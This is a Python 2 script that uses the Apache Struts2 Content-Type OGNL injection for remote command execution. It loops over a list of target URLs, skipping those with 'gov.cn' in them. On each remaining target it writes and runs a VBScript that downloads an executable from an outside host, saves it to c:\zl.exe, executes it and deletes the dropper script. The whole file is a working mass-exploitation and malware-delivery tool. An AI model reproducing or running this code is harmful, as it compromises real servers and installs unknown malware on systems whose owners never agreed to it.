#coding:utf-8
import urllib2
from Tkinter import *
import sys
import time
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
def poc(url,cmd):
    w_url = url

    register_openers()
    datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
    header[
        "User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header[
        "Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+cmd+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    request = urllib2.Request(w_url, datagen, headers=header)
    try:
        response = urllib2.urlopen(request,timeout=5).read()
    except:
        pass


if __name__ == '__main__':
    fp=open("quadgrams.txt","rb")
    while True:
        line=fp.readline()
        if line:
            if 'gov.cn' in line:
                pass
            else:
                print line
                poc(line,r"echo Set Post = CreateObject(\"Msxml2.XMLHTTP\") >>zl.vbs&&echo Set Shell = CreateObject(\"Wscript.Shell\") >>zl.vbs&&echo Post.Open \"GET\",\"http://www.baidu.com/server.exe\",0 >>zl.vbs&&echo Post.Send() >>zl.vbs&&echo Set aGet = CreateObject(\"ADODB.Stream\") >>zl.vbs&&echo aGet.Mode = 3 >>zl.vbs&&echo aGet.Type = 1 >>zl.vbs&&echo aGet.Open() >>zl.vbs&&echo aGet.Write(Post.responseBody) >>zl.vbs&&echo aGet.SaveToFile \"c:\\zl.exe\",2 >>zl.vbs&&echo wscript.sleep 1000 >>zl.vbs&&echo Shell.Run (\"c:\\zl.exe\") >>zl.vbs")
                poc(line,r"cscript zl.vbs")
                time.sleep(5)
                poc(line,r"c:\\zl.exe")
                poc(line,r"del zl.vbs")
